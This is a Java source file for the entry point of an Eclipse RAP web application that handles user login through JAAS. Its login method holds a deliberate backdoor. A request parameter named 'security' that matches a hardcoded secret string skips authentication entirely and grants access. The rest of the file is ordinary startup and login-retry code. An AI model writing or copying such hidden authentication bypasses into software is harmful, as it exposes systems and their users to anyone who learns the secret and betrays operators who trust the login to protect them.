package com.helio.boomer.rap;

import java.net.URL;

import javax.security.auth.Subject;
import javax.security.auth.login.LoginException;
import javax.servlet.http.HttpServletRequest;

import org.eclipse.equinox.security.auth.ILoginContext;
import org.eclipse.equinox.security.auth.LoginContextFactory;
import org.eclipse.jface.dialogs.MessageDialog;
import org.eclipse.rwt.RWT;
import org.eclipse.rwt.lifecycle.IEntryPoint;
import org.eclipse.swt.widgets.Display;
import org.eclipse.ui.PlatformUI;
import org.eclipse.ui.application.WorkbenchAdvisor;

import com.helio.boomer.rap.message.LoginMessages;

/**
 * This class controls all aspects of the application's execution
 * and is contributed through the plugin.xml.
 */
public class Application implements IEntryPoint {

//	private static final String JAAS_CONFIG_FILE = "data/jaas_config.txt"; //$NON-NLS-1$
	private static final String JAAS_CONFIG_FILE = "jaas_config.txt"; //$NON-NLS-1$
	private static final String JAAS_BACKDOOR_CONFIG_FILE = "data/jaas_backdoor_config.txt";

	private static final String SECURE_BACKDOOR = "h3s!backd00r";

	public int createUI() {
		Display display = PlatformUI.createDisplay();
		if (login(display)) {
			WorkbenchAdvisor advisor = new ApplicationWorkbenchAdvisor();
			return PlatformUI.createAndRunWorkbench(display, advisor);
		}
		return 0;
	}

	private boolean login(final Display display) {
		ILoginContext secureContext;
		String configName = "BOOMER"; //$NON-NLS-1$
		HttpServletRequest request = RWT.getRequest();
		String securityParameter = request.getParameter("security");
		if ((securityParameter != null) && (securityParameter.length() > 0) && securityParameter.equalsIgnoreCase(SECURE_BACKDOOR)) {
			URL configUrl = Activator.getDefault().getBundle().getEntry(JAAS_BACKDOOR_CONFIG_FILE);
 			secureContext = LoginContextFactory.createContext(configName, configUrl);
			return true;
		} else {
			URL configUrl = Activator.getDefault().getBundle().getEntry(JAAS_CONFIG_FILE);
 			secureContext = LoginContextFactory.createContext(configName, configUrl);
//			secureContext = LoginContextFactory.createContext(configName);
		}
		Subject s = null;
		do {
			try {
				s = secureContext.getSubject();
			} catch (LoginException e) {
				MessageDialog.openInformation(
						display.getActiveShell(),
						LoginMessages.Application_LOGIN_ERROR_TITLE,
						LoginMessages.Application_Application_LOGIN_ERROR_DESC);
			}
		} while (s == null);
		return true;
	}

}
